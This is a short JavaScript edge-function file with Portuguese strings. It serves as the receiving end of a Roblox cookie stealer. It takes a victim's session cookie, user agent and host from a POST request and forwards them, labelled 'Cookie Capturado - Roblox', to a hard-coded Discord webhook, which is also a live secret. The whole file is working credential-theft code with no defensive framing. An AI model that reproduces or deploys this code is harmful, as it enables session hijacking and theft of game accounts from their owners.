export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    if (req.method !== "POST") return new Response("Método não permitido", { status: 405 });

    const data = await req.json();
    const cookie = data.cookie || "Não enviado";
    const userAgent = data.userAgent || "Não enviado";
    const host = data.host || "Não enviado";

    const embed = {
      title: "Cookie Capturado - Roblox",
      color: 15158332,
      fields: [
        { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1024)}\`\`\``, inline: false },
        { name: "User Agent", value: `\`\`\`${userAgent.slice(0, 1024)}\`\`\``, inline: false },
        { name: "Host", value: host, inline: true },
        { name: "Timestamp", value: new Date().toISOString(), inline: true },
      ],
    };

    const payload = { embeds: [embed] };

    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!response.ok) throw new Error(`Falha no envio: ${response.status}`);

    return new Response("Enviado com sucesso!", { status: 200 });
  } catch (error) {
    const errorEmbed = {
      title: "Erro ao enviar webhook",
      description: `Erro: ${error.message}`,
      color: 15158332,
      timestamp: new Date().toISOString(),
    };
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [errorEmbed] }),
    }).catch(() => {});
    return new Response("Erro interno", { status: 500 });
  }
}
